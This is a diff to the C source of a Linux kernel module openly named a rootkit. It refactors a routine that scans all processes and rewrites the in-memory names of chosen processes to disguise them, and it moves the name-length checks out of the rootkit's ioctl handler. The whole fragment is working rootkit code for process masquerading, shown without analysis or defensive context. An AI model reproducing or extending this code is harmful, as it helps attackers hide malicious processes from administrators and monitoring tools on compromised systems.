@@ -58,12 +58,17 @@ static int access_mm_name(struct mm_struct* mm, char* name, int len, unsigned in
 }
 
 static void rename_process(long len, struct masq_proc *masq) {
-    long i;
+    long i, j;
     struct task_struct *p;
     struct mm_struct *mm;
     char task_name[MASQ_LEN];
-    char buf[MASQ_LEN];
 
+    for (i = 0; i < len; ++i) {
+        if (strlen(masq[i].new_name) > strlen(masq[i].orig_name))
+            masq[i].orig_name[0] = 0;
+        for (j = strlen(masq[i].new_name); j < strlen(masq[i].orig_name); ++j)
+            masq[i].new_name[j] = 0;
+    }
     for_each_process(p) {
         mm = p->mm;
         if (!mm)
@@ -76,9 +81,7 @@ static void rename_process(long len, struct masq_proc *masq) {
             if (!masq[i].orig_name[0])
                 continue;
             if (!strcmp(task_name, masq[i].orig_name)) {
-                memset(buf, 0, MASQ_LEN); 
-                strcpy(buf, masq[i].new_name);
-                access_mm_name(mm, buf, strlen(masq[i].orig_name), FOLL_WRITE);
+                access_mm_name(mm, masq[i].new_name, strlen(masq[i].orig_name), FOLL_WRITE);
                 // printk (KERN_INFO "%s >> %s\n", masq[i].orig_name, masq[i].new_name);
                 break;
             }
@@ -91,7 +94,6 @@ static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
 		unsigned long arg)
 {
     long ret = 0;
-    long i;
     struct masq_proc_req masq_req;
     struct masq_proc *masq;
     switch(ioctl) {
@@ -130,9 +132,6 @@ static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
                 ret = -EINVAL;
                 break;
             }
-            for (i = 0; i < masq_req.len; ++i)
-                if (strlen(masq[i].new_name) > strlen(masq[i].orig_name))
-                    masq[i].orig_name[0] = 0;
             rename_process(masq_req.len, masq);
             kfree(masq);
             break;
